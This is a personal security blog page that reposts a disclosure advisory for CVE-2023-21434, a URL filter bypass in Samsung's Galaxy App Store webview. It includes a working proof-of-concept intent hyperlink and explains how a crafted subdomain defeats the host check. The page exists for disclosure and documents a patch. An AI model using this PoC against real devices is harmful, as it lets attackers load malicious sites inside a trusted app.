<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>CVE-2023-21434 Details | YayWebsiteYay (I suck at titles)</title>
<meta name="generator" content="Jekyll v3.9.0" />
<meta property="og:title" content="CVE-2023-21434 Details" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Sometimes I want to publish stuff unfiltered." />
<meta property="og:description" content="Sometimes I want to publish stuff unfiltered." />
<link rel="canonical" href="http://localhost:4000/cves/cve-2023-21434" />
<meta property="og:url" content="http://localhost:4000/cves/cve-2023-21434" />
<meta property="og:site_name" content="YayWebsiteYay (I suck at titles)" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="CVE-2023-21434 Details" />
<script type="application/ld+json">
{"headline":"CVE-2023-21434 Details","@type":"WebPage","description":"Sometimes I want to publish stuff unfiltered.","url":"http://localhost:4000/cves/cve-2023-21434","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="YayWebsiteYay (I suck at titles)" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">YayWebsiteYay (I suck at titles)</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/published-research/">Published Research</a><a class="page-link" href="/cves/">My CVEs</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post">

  <header class="post-header">
    <h1 class="post-title">CVE-2023-21434 Details</h1>
  </header>

  <div class="post-content">
    <h4 id="original-post-httpsresearchnccgroupcom20230120technical-advisory-multiple-vulnerabilities-in-the-galaxy-app-store-cve-2023-21433-cve-2023-21434">Original post: <a href="https://research.nccgroup.com/2023/01/20/technical-advisory-multiple-vulnerabilities-in-the-galaxy-app-store-cve-2023-21433-cve-2023-21434/">https://research.nccgroup.com/2023/01/20/technical-advisory-multiple-vulnerabilities-in-the-galaxy-app-store-cve-2023-21433-cve-2023-21434/</a></h4>

<table>
  <tbody>
    <tr>
      <td><strong>Product</strong></td>
      <td>Galaxy Store 4.5.48.3, other versions affected</td>
    </tr>
    <tr>
      <td><strong>Severity</strong></td>
      <td>Moderate</td>
    </tr>
    <tr>
      <td><strong>CVE Reference</strong></td>
      <td>CVE-2023-21434</td>
    </tr>
    <tr>
      <td><strong>Type</strong></td>
      <td>URL Filter Bypass</td>
    </tr>
  </tbody>
</table>

<h2 id="summary">Summary</h2>

<p>It was found that a webview within the Galaxy App Store contained a filter which limited which domains that webview could browse to. However, the filter was not properly configured, which would allow the webview to browse to an attacker controlled domain.</p>

<h2 id="impact">Impact</h2>

<p>Either tapping a malicious hyperlink in Google Chrome or a pre-installed rogue application on a Samsung device can bypass Samsung’s URL filter and launch a webview to an attacker controlled domain.</p>

<h2 id="proof-of-concept-poc">Proof of Concept (PoC)</h2>

<p>While using the Chrome web browser on a Samsung device, the following hyperlink can be tapped to exploit this issue:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;h1&gt;
  &lt;a id="yayidyay" rel="noreferrer" href="intent://cloudgame/monitor?monitoringHost=&lt;host&gt;#Intent;action=android.intent.action.VIEW;package=com.sec.android.app.samsungapps;scheme=normalbetasamsungapps;S.android%2eintent%2eextra%2eREFERRER_NAME=http://com.sec.android.app.samsungapps;end"&gt;
YAYPOCYAY&lt;/a&gt;
&lt;/h1&gt;
</code></pre></div></div>

<p>In the above PoC, “<host>" needs to be replaced with an attacker controlled domain, and a malicious website must be hosted on the domain over HTTPS. The domain name must have "player.glb.samsung-gamelauncher.com" in it. For example, the domain "player.glb.samsung-gamelauncher.com.nccgroup.com" would be a valid domain.</host></p>

<h2 id="technical-walkthrough">Technical Walkthrough</h2>

<p>After launching the above PoC, the class <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.deeplink.CloudGameDeepLink</code> is loaded, and the method <code class="language-plaintext highlighter-rouge">e(context)</code> is executed. This method determines if the Cloud Game deeplink should be executed, and the requirements to return “True” are:</p>

<ul>
  <li>The “sender” of the intent must be “com.sec.android.app.samsungapps”
    <ul>
      <li>This can be achieved by adding the string intent extra <code class="language-plaintext highlighter-rouge">android.intent.extra.REFERRER_NAME</code> in a browsable intent, and launched from the Google Chrome browser</li>
      <li>Using the Samsung Browser will not meet this requirement due to how the browser handles browsable intents</li>
    </ul>
  </li>
  <li>The “monitoringHost” parameter must contain the string “player.glb.samsung-gamelauncher.com”</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>private boolean e(Context context) {
    if (context.getPackageName().equals(getSender())) {
        return this.L.getMonitoringHost().contains("player.glb.samsung-gamelauncher.com");
    }
    Loger.w(String.format("[%s] Unauthorized access from %s", M, getSender()));
    return false;
    }
</code></pre></div></div>

<p>An attacker can register an arbitrary domain and add “player.glb.samsung-gamelauncher.com” as a subdomain. For example, the domain “player.glb.samsung-gamelauncher.com.nccgroup.com” would force the method <code class="language-plaintext highlighter-rouge">e(context)</code> to return “True”</p>

<h2 id="recommendation">Recommendation</h2>

<p>Samsung has released an updated version of the Galaxy App Store (version 4.5.49.8). Users should open the Galaxy App Store on their phone, and if prompted, download and install the latest version.</p>

<h2 id="timeline">Timeline</h2>

<table>
  <tbody>
    <tr>
      <td><strong>Date</strong></td>
      <td><strong>Summary</strong></td>
    </tr>
    <tr>
      <td>03/12/2022</td>
      <td>Samsung notified of vulnerability</td>
    </tr>
    <tr>
      <td>03/12/2022</td>
      <td>Samsung acknowledge receipt of report and a security analyst was assigned to analyze the report</td>
    </tr>
    <tr>
      <td>18/12/2022</td>
      <td>Samsung confirmed the vulnerability and rated it as a Moderate risk</td>
    </tr>
    <tr>
      <td>01/01/2023</td>
      <td>Samsung has released Galaxy App Store version 4.5.49.8 and has publicly disclosed the issue</td>
    </tr>
  </tbody>
</table>

  </div>

</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">YayWebsiteYay (I suck at titles)</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">YayWebsiteYay (I suck at titles)</li><li><a class="u-email" href="mailto:Fake_email_link">Fake_email_link</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">yogehi</span></a></li><li><a href="https://www.twitter.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">yogehi</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Sometimes I want to publish stuff unfiltered.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
